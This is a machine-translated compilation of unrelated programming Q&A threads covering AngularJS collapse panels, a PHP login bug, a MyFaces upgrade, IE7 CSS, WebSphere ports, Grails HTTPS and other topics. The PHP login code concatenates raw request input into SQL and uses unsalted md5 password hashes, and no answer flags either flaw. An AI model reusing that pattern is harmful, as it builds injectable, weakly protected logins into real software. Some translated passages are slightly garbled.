我正在尝试找出一种使用 Angular js 进行扩展和折叠的方法。如果不操纵控制器中的 dom 对象（这不是角度方式），我无法找到一种优雅的方式来做到这一点。目前我有一个很好的方法来做一层展开和折叠。但是，当我开始嵌套时，事情变得复杂并且无法按照我想要的方式工作（在不应该的情况下扩展和折叠多个区域）。问题来自我不知道如何通过 ng-click 发送唯一标识符以仅展开/折叠正确的内容。我应该提到这些项目在 ng-repeat 中，所以我可以自定义发送的参数。

我能够使用这个[jsfiddle](http://jsfiddle.net/rur_d/tNZAm/)来帮助我进行一层展开和折叠工作。然而，这是一种切换方式，我希望用户能够在扩展其他内容的同时保持扩展。所以我解决这个问题的方法是使用一个数组，每次点击某个东西时，该点击项的索引将被添加到数组中并扩展类。当用户再次单击时，索引从数组中删除并且该区域被折叠。

我发现你可以做到的另一种方法是使用指令。但是我真的找不到任何例子来理解指令是如何工作的。在编写指令时，我什至不知道如何开始。

我目前的设置是这样的：

```
function Dexspander($scope) {
    $scope.ExpandArray = [];

    //Push or pop necessary elements for tracking
    $scope.DespopulatArray = function (identifier, element) {
    if (_.indexOf($scope.ExpandArray, identifier + element) != -1) {
            $scope.ExpandArray.splice(_.indexOf($scope.ExpandArray, identifier + element), 1);
        } else {
            $scope.ExpandArray.push(identifier + element);
        }
    }

    //Change class of necessary elements
    $scope.Dexspand = function (identifier, element) {
        if (_.indexOf($scope.ExpandArray, identifier + element) != -1) {
            return "expand";
        } else {
            return "collapse";
        }
    }
}

<div class="user-header" ng-repeat="user in users">
    <h1 ng-click="DespopulatArray('user', $index)">Expand</h1>
</div>
<div class="user-content" ng:class="Dexspand('user', $index)">
    <div class="content">
        <div class="user-information">
            <div class="info-header">
                <h1 ng-click="DespopulatArray('info', $index)>Some Information</h1>
            </div>
            <div class="info-contents" ng:class="Dexspand('info', $index)">
                stuff stuff stuff stuff...
            </div>
        </div>
    </div>
</div> 
```

此设置的问题是，如果我必须扩展父 div 并且它们下方都有要扩展的内容，则单击扩展文本将在两个区域中扩展它们，因为它们不是唯一的。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2014-01-12T16:04:16.780

您可以在 html 中完全解决这个问题：

```
<div>
  <input ng-model=collapse type=checkbox>Title
  <div ng-show=collapse>
     Only shown when checkbox is clicked
  </div>
</div> 
```

这也适用于 ng-repeat，因为它将为每个成员创建一个本地范围。

```
<table>
  <tbody ng-repeat='m in members'>
    <tr>
       <td><input type=checkbox ng-model=collapse></td>
       <td>{{m.title}}</td>
    </tr>
    <tr ng-show=collapse>
      <td> </td>
      <td>{{ m.content }}</td>
    </tr>
  </tbody>
</table> 
```

请注意，即使重复具有自己的作用域，最初它也会从超作用域的折叠中继承值。这允许您在一个地方设置初始值，但这可能会令人惊讶。

您当然可以重新设置复选框的样式。见[http://jsfiddle.net/azD5m/5/](http://jsfiddle.net/azD5m/5/)

**更新小提琴： http:** [//jsfiddle.net/azD5m/374/](http://jsfiddle.net/azD5m/374/)原始小提琴使用结束`</input>`标签来添加 HTML 文本标签，而不是使用`<label>`标签。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2013-01-12T18:00:55.293

> 问题来自我不知道如何通过 ng-click 发送唯一标识符以仅展开/折叠正确的内容。

您可以通过`$event`ng-click（ng-dblclick 和 ng-mouse 事件）传递，然后您可以确定是哪个元素导致了该事件：

```
<a ng-click="doSomething($event)">do something</a> 
```

控制器：

```
$scope.doSomething = function(ev) {
    var element = ev.srcElement ? ev.srcElement : ev.target;
    console.log(element, angular.element(element))
    ...
} 
```

* * *

另见[http://angular-ui.github.com/bootstrap/#/accordion](http://angular-ui.github.com/bootstrap/#/accordion)

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2013-12-23T17:17:30.273

见[http://angular-ui.github.io/bootstrap/#/collapse](http://angular-ui.github.io/bootstrap/#/collapse)

```
function CollapseDemoCtrl($scope) {
  $scope.isCollapsed = false;
}

<div ng-controller="CollapseDemoCtrl">
    <button class="btn" ng-click="isCollapsed = !isCollapsed">Toggle collapse</button>
    <hr>
    <div collapse="isCollapsed">
        <div class="well well-large">Some content</div> 
    </div>
</div> 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-11-07T08:49:06.377

我刚刚使用 Angular 使用 ng-show、ng-click 和 ng-init 编写了一个简单的 zippy/collapsable。它实现到一个级别，但可以轻松扩展到多个级别。

将布尔变量分配给 ng-show 并在单击标题时切换它。

[在这里](http://allzhere.in/2013/11/06/creating-a-zippy-collapsable-div-using-angular-js/)查看 ![在此处输入图像描述](../Images/5dcfab9a59c36390719a54d0a172a3ce.png)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2017-06-17T17:03:38.180

这是一个使用 ng-repeat 的关于 Angular JS 的简单易用的解决方案，可能会有所帮助。

```
var app = angular.module('myapp', []);

app.controller('MainCtrl', function($scope) {

  $scope.arr= [
    {name:"Head1",desc:"Head1Desc"},
    {name:"Head2",desc:"Head2Desc"},
    {name:"Head3",desc:"Head3Desc"},
    {name:"Head4",desc:"Head4Desc"}
    ];

    $scope.collapseIt = function(id){
      $scope.collapseId = ($scope.collapseId==id)?-1:id;
    }
});
```

```
/* Put your css in here */
li {
  list-style:none;
  padding:5px;
  color:red;
}
div{
  padding:10px;
  background:#ddd;
}
```

```
<!DOCTYPE html>
<html ng-app="myapp">
  <head>
    <meta charset="utf-8" />
    <title>AngularJS Simple Collapse</title>
    <script data-require="angular.js@1.5.x" src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.5.11/angular.min.js" data-semver="1.5.11"></script>
</head>
<body ng-controller="MainCtrl">
<ul>
  <li ng-repeat='ret in arr track by $index'>
    <div ng-click="collapseIt($index)">{{ret.name}}</div>
    <div ng-if="collapseId==$index">
      {{ret.desc}}
    </div>
  </li>
</ul>
</body>
</html>
```

这应该满足您的要求。这是一个工作代码。

Plunkr 链接 [http://plnkr.co/edit/n5DZxluYHi8FI3OmzFq2?p=preview](http://plnkr.co/edit/n5DZxluYHi8FI3OmzFq2?p=preview)

Github：[https ://github.com/deepakkoirala/SimpleAngularCollapse](https://github.com/deepakkoirala/SimpleAngularCollapse)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-12-06T10:57:11.830

在 html 中

```
button ng-click="myMethod()">Videos</button> 
```

在角度

```
 $scope.myMethod = function () {
         $(".collapse").collapse('hide');    //if you want to hide
         $(".collapse").collapse('toggle');  //if you want toggle
         $(".collapse").collapse('show');    //if you want to show
} 
```

# php - php 代码突然停止工作。奇怪的行为？

> ID：12603433
> 
> 赞同：0
> 
> 时间：2012-09-26T13:57:39.197
> 
> 标签：php, mysql, sql

我为登录页面构建了一个代码。直到昨天，该代码都运行良好。但是，今天它不像我想要的那样工作。它目前在我的本地主机上。

```
if (isset($_POST['userpassword']))
        {
            include('db.php'); //I am using passwordu instead of password.
            $query = "SELECT * FROM users WHERE username = '".$_REQUEST['username']."' AND passwordu = '".md5($_REQUEST['userpassword'])."'";
            $result = mysql_query($query);
            $num_rows = mysql_num_rows($result);
            if ($num_rows == 1)
            {
                echo "Congratulations. You are now Logged in. You will be logged out when the Browser is closed.";
                $_SESSION['logval'] = TRUE;
            }
            else
            { 
                            echo "You Have Entered Wrong Information. <b>Please Try AGAIN."; }
?> 
```

每当我输入错误的密码时，它都会显示正确的内容。但是，当我输入正确的密码时，它也显示密码未被接受。

直到昨天，这段代码都运行良好。今天，这个问题出现了。

**我已经想出了解决这个问题的办法。**

我将 varchar(20) 用于 passwordu 字段。所以，它不起作用。我现在将其设置为更大的值，即 100（出于安全考虑）。它就像一个魅力。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T14:02:10.367

我看到的一个明显问题是您正在检查`$num_rows == 1`. 虽然在大多数情况下这很好，但它可能掩盖了重复帐户的潜在问题。这就是说，如果您拥有超过 1 个相同的帐户，您会产生凭据不正确的错觉，而实际上它们是不正确的。

作为测试，试试下面的例子，看看它是否开始工作：

```
if ($num_rows >= 1)
{
   //Correct info
}
else
{
   //Incorrect info
} 
```

虽然这可能会解决您的问题，但您需要弄清楚为什么会有重复的帐户。

*编辑*

我会在下面的评论中考虑 Mike Brant 的建议。确实，应该有一个独特的约束来防止潜在的重复案例。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T14:04:34.293

好的，这是一个模糊的情况，根据发布的代码片段，很难确定出了什么问题（这样的片段似乎是正确的），而且您还说它直到昨天才有效。

首先要做的是尝试一些调试。显然这个条件没有返回真：

`if ($num_rows == 1)`

所以首先做一个`die("num_rows = ".$num_rows);`检查它返回的值。把它贴在这里，我们可以从那里走得更远。

# jsf - 从 myfaces 1.1 迁移到 1.2

> ID：12603435
> 
> 赞同：0
> 
> 时间：2012-09-26T13:57:47.543
> 
> 标签：jsf, jsf-1.2, myfaces

我正在尝试将我们的 Web 应用程序从 myfaces 1.1 升级到 1.2。我希望这比直接迁移到最新的 2.x 版本更容易。但是，当我尝试启动应用程序时，我遇到了这样的错误：

```
SEVERE: StandardWrapper.Throwable
java.lang.IllegalStateException: No Factories configured for this Application. This happens if the faces-initialization does not work at all - make sure that you properly include all configuration settings necessary for a basic faces application and that all the necessary libs are included. Also check the logging output of your web application and your container for any exceptions!
If you did that and find nothing, the mistake might be due to the fact that you use some special web-containers which do not support registering context-listeners via TLD files and a context listener is not setup in your web.xml.
A typical config looks like this;
<listener>
  <listener-class>org.apache.myfaces.webapp.StartupServletContextListener</listener-class>
</listener>

at javax.faces.FactoryFinder.getFactory(FactoryFinder.java:106)
at javax.faces.webapp.FacesServlet.init(FacesServlet.java:137)
at evo.ui.jsf.EvoFacesServlet.init(EvoFacesServlet.java:56)
at org.apache.catalina.core.StandardWrapper.loadServlet(StandardWrapper.java:1173)
at org.apache.catalina.core.StandardWrapper.load(StandardWrapper.java:993)
at org.apache.catalina.core.StandardContext.loadOnStartup(StandardContext.java:4420)
at org.apache.catalina.core.StandardContext.start(StandardContext.java:4733)
at org.apache.catalina.core.ContainerBase.start(ContainerBase.java:1053)
at org.apache.catalina.core.StandardHost.start(StandardHost.java:840)
at org.apache.catalina.core.ContainerBase.start(ContainerBase.java:1053)
at org.apache.catalina.core.StandardEngine.start(StandardEngine.java:463)
at org.apache.catalina.core.StandardService.start(StandardService.java:525)
at org.apache.catalina.core.StandardServer.start(StandardServer.java:754)
at org.apache.catalina.startup.Catalina.start(Catalina.java:595)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
at java.lang.reflect.Method.invoke(Method.java:592)
at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:289)
at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:414) 
```

在应用程序日志中可以观察到这样的异常：

```
2012-09-26 15:44:00|main|ERROR|org.apache.myfaces.webapp.AbstractFacesInitializer|An error occured while initializing MyFaces: null
java.lang.NullPointerException
    at org.apache.myfaces.webapp.Jsp21FacesInitializer.initContainerIntegration(Jsp21FacesInitializer.java:61)
    at org.apache.myfaces.webapp.AbstractFacesInitializer.initFaces(AbstractFacesInitializer.java:96)
    at org.apache.myfaces.webapp.StartupServletContextListener.contextInitialized(StartupServletContextListener.java:89)
    at org.apache.catalina.core.StandardContext.listenerStart(StandardContext.java:4205)
    at org.apache.catalina.core.StandardContext.start(StandardContext.java:4704)
    at org.apache.catalina.core.ContainerBase.start(ContainerBase.java:1053)
    at org.apache.catalina.core.StandardHost.start(StandardHost.java:840)
    at org.apache.catalina.core.ContainerBase.start(ContainerBase.java:1053)
    at org.apache.catalina.core.StandardEngine.start(StandardEngine.java:463)
    at org.apache.catalina.core.StandardService.start(StandardService.java:525)
    at org.apache.catalina.core.StandardServer.start(StandardServer.java:754)
    at org.apache.catalina.startup.Catalina.start(Catalina.java:595)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:592)
    at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:289)
    at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:414) 
```

web.xml 看起来像这样：

```
<?xml version="1.0" encoding="UTF-8"?>

<web-app version="2.5" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd">

<description>My app</description>
<display-name>My app</display-name>

<welcome-file-list>
    <welcome-file>index.html</welcome-file>
</welcome-file-list>

<context-param>
    <param-name>javax.faces.DEFAULT_SUFFIX</param-name>
    <param-value>.xhtml</param-value>
</context-param>

<context-param>
    <param-name>facelets.REFRESH_PERIOD</param-name>
    <param-value>2</param-value>
</context-param>

<context-param>
    <param-name>facelets.DEVELOPMENT</param-name>
    <param-value>false</param-value>
</context-param>

<context-param>
    <param-name>facelets.RESOURCE_RESOLVER</param-name>
    <param-value>evo.ui.jsf.EvoResourceResolver</param-value>
</context-param>

<context-param>
    <param-name>javax.faces.STATE_SAVING_METHOD</param-name>
    <param-value>server</param-value>
</context-param>    

<!-- AJAX4JSF -->
<context-param>
    <param-name>org.ajax4jsf.VIEW_HANDLERS</param-name>
    <param-value>com.sun.facelets.FaceletViewHandler</param-value>
</context-param>

<context-param>
    <param-name>org.ajax4jsf.SKIN</param-name>
    <param-value>DEFAULT</param-value>
</context-param>

<context-param>
    <param-name>evo.ajaxlink.level</param-name>
    <param-value>2</param-value>
</context-param>

<filter>
    <display-name>Ajax4jsf Filter</display-name>
    <filter-name>ajax4jsf</filter-name>
    <filter-class>org.ajax4jsf.Filter</filter-class>
    <init-param>
        <param-name>forceparser</param-name>
        <param-value>false</param-value>
    </init-param>
</filter>

<filter-mapping>
    <filter-name>ajax4jsf</filter-name>
    <servlet-name>Faces Servlet</servlet-name>
    <dispatcher>REQUEST</dispatcher>
    <dispatcher>FORWARD</dispatcher>
    <dispatcher>INCLUDE</dispatcher>
</filter-mapping>

<filter>
    <filter-name>UploadMultipartFilter</filter-name>
    <filter-class>
        evo.ui.jsf.filters.UploadMultipartFilter
    </filter-class>
</filter>

<filter>
    <filter-name>OpenSessionInViewFilter</filter-name>
    <filter-class>
        org.springframework.orm.hibernate3.support.OpenSessionInViewFilter
    </filter-class>
    <init-param>
        <param-name>singleSession</param-name>
        <param-value>true</param-value>
    </init-param>
    <init-param>
        <param-name>sessionFactoryBeanName</param-name>
        <param-value>configDatabaseSessionFactory</param-value>
    </init-param>
</filter>

<filter-mapping>
    <filter-name>OpenSessionInViewFilter</filter-name>
    <url-pattern>*.jsf</url-pattern>
</filter-mapping>

<filter>
    <filter-name>MyFacesExtensionsFilter</filter-name>
    <filter-class>
        org.apache.myfaces.webapp.filter.ExtensionsFilter
    </filter-class>
    <init-param>
        <param-name>maxFileSize</param-name>
        <param-value>20m</param-value>
    </init-param>
</filter>

<filter-mapping>
    <filter-name>MyFacesExtensionsFilter</filter-name>
    <servlet-name>Faces Servlet</servlet-name>
</filter-mapping>

<filter-mapping>
    <filter-name>MyFacesExtensionsFilter</filter-name>
    <url-pattern>/faces/myFacesExtensionResource/*</url-pattern>
</filter-mapping>

<filter-mapping>
    <filter-name>UploadMultipartFilter</filter-name>
    <servlet-name>Faces Servlet</servlet-name>
</filter-mapping>

<filter>
    <description>Force encoding to get correct results of sorting
    Global Task List with fields containing non-ASCII characters.
    </description>
    <filter-name>EncodingFilter</filter-name>
    <filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>
    <init-param>
        <param-name>encoding</param-name>
        <param-value>UTF-8</param-value>            
    </init-param>
    <init-param>
        <param-name>forceEncoding</param-name>
        <param-value>true</param-value>
    </init-param>
</filter>

<filter-mapping>
    <filter-name>EncodingFilter</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>

<servlet>
    <servlet-name>Faces Servlet</servlet-name>
    <servlet-class>evo.ui.jsf.EvoFacesServlet</servlet-class>
    <load-on-startup>1</load-on-startup>
</servlet>

<servlet-mapping>
    <servlet-name>Faces Servlet</servlet-name>
    <url-pattern>*.jsf</url-pattern>
</servlet-mapping>

<servlet-mapping>
    <servlet-name>Faces Servlet</servlet-name>
    <url-pattern>/faces/*</url-pattern>
</servlet-mapping>

<listener>
    <listener-class>
        org.apache.myfaces.webapp.StartupServletContextListener
    </listener-class>
</listener>

<listener>
    <listener-class>
        org.springframework.web.context.ContextLoaderListener
    </listener-class>
</listener>

<listener>
    <listener-class>
        org.springframework.web.context.request.RequestContextListener
    </listener-class>
</listener>

<!-- XFIRE Webservices -->
<servlet>
    <servlet-name>xfire</servlet-name>
    <servlet-class>
        org.springframework.web.servlet.DispatcherServlet
    </servlet-class>
</servlet>

<servlet-mapping>
    <servlet-name>xfire</servlet-name>
    <url-pattern>/services/*</url-pattern>
</servlet-mapping>

<session-config>
  <session-timeout>60</session-timeout> 
</session-config> 
```

<web-app> 标签已从“2.4”更新为 version="2.5"。我已经尝试用原始的 javax.faces.webapp.FacesServlet 替换我们的委托 servlet (EvoFacesServlet)，但没有成功。

servlet 容器是 Tomcat 6。

我还应该怎么做才能使其正常工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-02T15:14:14.857

从部署中删除与容器相关的 jar 有助于：servlet-api.jar、el-api.jar、jsp-api.jar。不确定其中哪一个是问题的根源。

# iphone - XCode 4.5 无法将 App 上传到 iTunes App Store

> ID：12603441
> 
> 赞同：0
> 
> 时间：2012-09-26T13:57:59.137
> 
> 标签：iphone, ios, xcode, xcode4.5

![](../Images/06ccc4a810c263c5ef8b3df2a0c2b5ae.png)

我在 3 天前升级了 XCode 4.5，现在每当我将任何应用程序上传到应用商店时，我都会收到三个错误，即使我身边没有任何问题。我已经在正确的证书下使用正确的临时配置文件签署了应用程序。但是，无论我将任何应用程序从我的 XCode 上传到 App Store，我仍然遇到同样的问题。如果有人可以解决这个问题，请帮助我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T16:23:33.037

您是否尝试过清理和构建新档案？也许审查项目配置。升级后破坏项目元数据并不罕见（从 GCC 更改为 LLVM 后我有些头疼）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T16:25:28.420

这是我认为您应该首先查看的第二个警告。

看起来好像您正在使用错误的配置文件进行构建（您不应该使用 Development 或 AdHoc），或者您正在使用过期的分发证书进行构建。

# css - IE7 CSS 表格标题边框未与 tbody 单元格对齐

> ID：12603458
> 
> 赞同：0
> 
> 时间：2012-09-26T13:59:06.750
> 
> 标签：css, internet-explorer, cross-browser, internet-explorer-7, css-tables

我需要在 x 和 y 轴上都有一个滚动表。

我通过使用 jQuery 将现有的表头克隆到一个新表中来实现这一点。

我在这里嘲笑了这个问题：

[http://jsfiddle.net/PaQne/1/](http://jsfiddle.net/PaQne/1/)

在 IE7 中，即使 CSS 相同，克隆的 thead 单元格的边框也不与父 thbody 单元格对齐。

有解决办法吗？

我明白这不是最佳实践，IE7 是一个垂死的浏览器，但它是客户端的要求。

 `* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:27:51.520

删除此规则：

```
.grid-cntr .data-grid thead {
    display: none;
} 
```

使边界对齐。但显然你也想在 IE7 上隐藏标题，所以让我们使用一个 hack！

```
.grid-cntr .data-grid thead {
    display: none;
    *display:block; /* target IE7 and below only */
} 
```

然后，添加此规则：

```
.grid-cntr .data-grid {
    *margin-top:-32px;
} 
```

**[工作演示](http://jsfiddle.net/gionaf/fn7gb/)**

否则，如果你想保持你的代码“干净”，你可以使用[条件注释](http://www.quirksmode.org/css/condcom.html)。

将此代码添加到您的 head 部分，*在*普通 css 之后：

```
<!--[if lte IE 8]>
<style>
.grid-cntr .data-grid thead { display:block; }
grid-cntr .data-grid { margin-top:-32px; }
</style>
<![endif]--> 
```

* * *

无论如何，您正在使用`:first-child`和`:last-child`选择器，但请检查此[兼容性表](http://www.quirksmode.org/css/contents.html)：

1.  `last-child`根本无法在 IE7 和 8**上运行**
2.  `first-child`仅适用于**静态元素**，不适用于生成的内容

如果您需要与 IE7+ 完全兼容，请尝试使用类。

还有[ie9.js](http://code.google.com/p/ie7-js/)，它对旧 IE 版本上的 CSS3 选择器做得很好。

* * *

那么你有这个规则：

```
.data-grid td:first-child {
    border-width: 1px 0 0 0;
} 
```

你知道这条规则会覆盖最后一行吗？

```
.data-grid tr:last-child td {
    border-width: 1px 1px 0 1px;
} 
```

也许你想使用

```
.data-grid td:first-child {
    border-width: 1px 0 0 0 !important;
} 
````

# java - 访问 Websphere 变量

> ID：12603461
> 
> 赞同：4
> 
> 时间：2012-09-26T13:59:13.007
> 
> 标签：java, variables, websphere

我想从 java 类中获取 Websphere 变量 ORB_LISTENER_PORT 的值。怎么做？

我已经阅读[了topik](https://stackoverflow.com/questions/3449981/accessing-websphere-6-1-variables)并理解了它。我认为我必须使用一些值而不是“expandVariable”。但是什么样的价值呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T05:30:39.090

我自己解决了这个问题。以下代码示例和他的工作结果。

```
import com.ibm.websphere.management.Session;
import com.ibm.websphere.management.configservice.ConfigService;
import com.ibm.websphere.management.configservice.ConfigServiceFactory;
import com.ibm.websphere.management.configservice.ConfigServiceHelper;

    public void readWebsphereConfiguration( PrintWriter out ){
        try{
            out.println("<p>Using ConfigService to get the hostName and port of this server.</p>");
            Session session = new Session();
            ConfigService cs = ConfigServiceFactory.getConfigService();

            ObjectName[] serverIndexONs = cs.resolve(session, "ServerIndex=");
            String hostName = (String) cs.getAttribute(session, serverIndexONs[0], "hostName");
            out.println("<p>HostName: " + hostName + "</p>");

            ObjectName[] namedEndPointsONs = cs.queryConfigObjects(session, serverIndexONs[0], ConfigServiceHelper.createObjectName(null, "NamedEndPoint"), null);
            for (int i = 0; i < namedEndPointsONs.length; ++i){
                String str = (String) cs.getAttribute(session, namedEndPointsONs[i], "endPointName");
                ObjectName[] theEndPoints = cs.queryConfigObjects(session, namedEndPointsONs[i], ConfigServiceHelper.createObjectName(null, "EndPoint"), null);
                String szValue = "";
                if(theEndPoints != null && theEndPoints.length > 0){
                    szValue = ((Integer) cs.getAttribute(session, theEndPoints[0], "port")).toString();
                }
                out.println("<p>" + str + "=" + szValue +"</p>");
            }
        }catch(Exception e){
            out.println("<p>Exception while trying to fetch the hostname and port information.: " + e.getMessage() + "</p>");
            out.println("<p>Exception:" + e.getStackTrace() + "</p>");
        }
    } 
```

功能清单是：

*   引导地址=2809
*   SOAP_CONNECTOR_ADDRESS=8880
*   SAS_SSL_SERVERAUTH_LISTENER_ADDRESS=9401
*   CSIV2_SSL_SERVERAUTH_LISTENER_ADDRESS=9403
*   CSIV2_SSL_MUTUALAUTH_LISTENER_ADDRESS=9402
*   WC_adminhost=9060
*   WC_defaulthost=9080
*   DCS_UNICAST_ADDRESS=9353
*   WC_adminhost_secure=9043
*   WC_defaulthost_secure=9443
*   ORB_LISTENER_ADDRESS=9100
*   SIP_DEFAULTHOST=5060
*   SIP_DEFAULTHOST_SECURE=5061
*   SIB_ENDPOINT_ADDRESS=7276
*   SIB_ENDPOINT_SECURE_ADDRESS=7286
*   SIB_MQ_ENDPOINT_ADDRESS=5558
*   SIB_MQ_ENDPOINT_SECURE_ADDRESS=5578
*   IPC_CONNECTOR_ADDRESS=9633
*   OVERLAY_UDP_LISTENER_ADDRESS=11003
*   OVERLAY_TCP_LISTENER_ADDRESS=11004

# grails - Deploying a Grails web app that requires HTTPS on Cloud Foundry

> ID：12603463
> 
> 赞同：2
> 
> 时间：2012-09-26T13:59:19.163
> 
> 标签：grails, cloud-foundry

I have deployed a very simple Grails test app on Cloud Foundry which uses spring-security for the login page.

I want to require HTTPS access for this login page so that passwords are not sent in clear text.

First thing I did was to browse to my test app using HTTPS which worked fine, so that confirmed that Cloud Foundry can service HTTPS requests for my app.

Next I added the following to Config.groovy to require HTTPS access to my pages:

```
grails.plugins.springsecurity.auth.forceHttps = true

grails.plugins.springsecurity.secureChannel.definition = [
        '/': 'REQUIRES_SECURE_CHANNEL'
] 
```

Now when I try to deploy using `grails cf-update` it hangs when `Trying to start application...`

If if I remove the requirement for HTTPS it succeeds.

I'm guessing that maybe there is a problem with the check for whether the application has started. Is this using a HTTP url which is then getting redirected to HTTPS as I cannot see any problems in the logs?

Any ideas?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T15:54:32.847

I found out that there currently is an issue with CloudFoundry + Spring Security where `HttpServletRequest.isSecure()` does not return the correct value when using https. This trumps Spring Security in doing an infinite redirect loop when requiring a secure channel.

I witnessed that on a plain Spring project, but this may be what your grails project is suffering from. One workaround at the moment would be to wrap your HttpServletRequests so that `isSecure()` looks at the scheme to decide what to return.

If you try your secured URL in a browser, what do you get (assuming the app has actually started, although the grails plugin tells otherwise)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T21:46:10.520

The problem is that [cloudfoundry terminates HTTPS at the loadbalancer](http://support.cloudfoundry.com/entries/20153602-is-it-possible-to-visit-my-application-via-ssl-https). And there is no way to get HTTPS all the way to your app, so 'REQUIRES_SECURE_CHANNEL' will not work on cloudfoundry.

If you want a gross hack to try to check that HTTPS was used between the user and the loadbalancer you can look at the headers in a filter. Eg.

```
 sslHeaderRequireFilter(controller:'*', action:'*') {
        before = {
            def headerNames = request.headerNames.collect{ it }             
            if(! headerNames.contains('sslclientcertstatus') ){
                render "Only available on https"
                return false    
            }                   
        }
    } 
```

# java - PHP 多次运行 .jar 文件 - 可扩展性？

> ID：12603467
> 
> 赞同：1
> 
> 时间：2012-09-26T13:59:31.167
> 
> 标签：java, php, jar, scalability

我正在为化工行业构建一个 Web 应用程序。它基本上在化学结构数据库中搜索。需要进行大量化学信息学计算，并且有许多用 Java 编写的开源解决方案。

我目前想知道使用什么编程语言。我需要在 Java 中使用一些函数，我不想用 Java 编写整个系统，因为我不熟悉在其中编写 Web 应用程序。

所以我有了这个想法，准备一些带有所需功能的 .jar 文件，并通过命令行在 PHP 中使用它们。我想知道这个解决方案的可扩展性。

例如在一个周期内调用 1000 次 PHP 中的 .jar 文件是否很快？传递给 .jar 的参数可以多长时间？我假设大型数组转换为字符串作为参数。我怀疑这是否是一个好主意，为什么我不这样做？

谢谢你的想法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-26T14:07:46.303

不，它没有效率。您将运行 1000 个 JVM 副本。加上启动/关闭这些 jvm 的开销。你最好使用一个合适的java服务器，比如Tomcat。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-26T14:28:32.440

可以办到

你提到参数。我假设您的意思是命令行参数。你是对的，这可能是不可扩展的。相反，使用标准输入作为输入，使用标准输出作为输出。

您提到调用 jar 文件 1000 次。我假设您的意思是调用 jar 文件的主要方法。这将非常缓慢。而是尽可能多地在 java 中实现，因此每次请求启动 jar 文件几次。少数电话可能是可以接受的。只是没有任何循环。

基本上为java中的整个请求准备所有数据并将其打印到您从php读取的stdout。

当然，如果你有时间学习 jsp+servlet，在 servlet 容器中运行会更快。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-26T14:11:03.900

你对此提出质疑是对的。除了可能很慢之外，混合 PHP 和 Java 也可能不是一个明智的主意。您应该使用 100% PHP 或 100% Java，但不能同时使用两者。我认为两者都能够满足您的需求，因此我认为您应该更好地研究这个问题。

我个人会建议 Java，因为它相当广泛地处理后端和前端，并且在线上有很多支持和库可用。如果您希望坚持使用 PHP，那么我认为您也可以这样做，尽管您应该小心构建代码，否则您可能会轻易地使您的 Web 应用程序复杂化。

*但是，假设这些选项都不是您希望采用的路径：* 我认为参数大小的任何限制首先是操作系统的限制。但是，如果您认为您可能会达到这些数字，您可能应该考虑写入文件并从中读取这些 jar。

# iphone - 增强现实 iOS：标记检测和 3D 投影

> ID：12603471
> 
> 赞同：4
> 
> 时间：2012-09-26T13:59:41.273
> 
> 标签：iphone, ios, image-processing, augmented-reality

我需要开发一个 iOS 应用程序，它可以通过 iPhone 摄像头检测标记并在此标记上投影 3D 模型。

我整天都在寻找关于这个主题的一些有用信息，但我得到的只是 ARToolkit/OpenCV/NyARToolkit/cpp 等等等等的洗脑组合……在编译和组合我下载的库时，我是个菜鸟来自不同来源的几个示例应用程序，看看我是否能理解，但这只是“黑色准备使用”的魔法。SO上关于这个主题的许多问题都是一两年前的，所以也许有一些有价值的东西。

使用 iPhone 摄像头或使用 OpenGL - 有很多教程可以开始，但是检测标记/图像和使用所需的库是令人无奈的事情。从什么开始，从哪里开始？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-26T14:49:01.913

我发现了这个[https://github.com/jonmarimba/NyArToolkit-iOS](https://github.com/jonmarimba/NyArToolkit-iOS)

我没有尝试过，因为我将[NyARToolKit 用于 Unity3d](http://nyatla.jp/nyartoolkit/wp/?page_id=556)，它很棒。

NyARToolKit for Unity3D 附带示例。使用 Unity3D 创建应用程序（iOS、Android、桌面）非常容易。

检查本[教程](http://www.morethantechnical.com/2009/07/01/augmented-reality-on-the-iphone-using-nyartoolkit-w-code/)

希望对你有帮助

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-08T11:48:01.923

我最终得到了新的 Vuforia iOS SDK。他们在 12 月发布了第 2 版——它非常酷，还有云识别和以前的东西。尽管我认为它确实很难咬住它，但它确实发挥了作用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-28T09:12:00.987

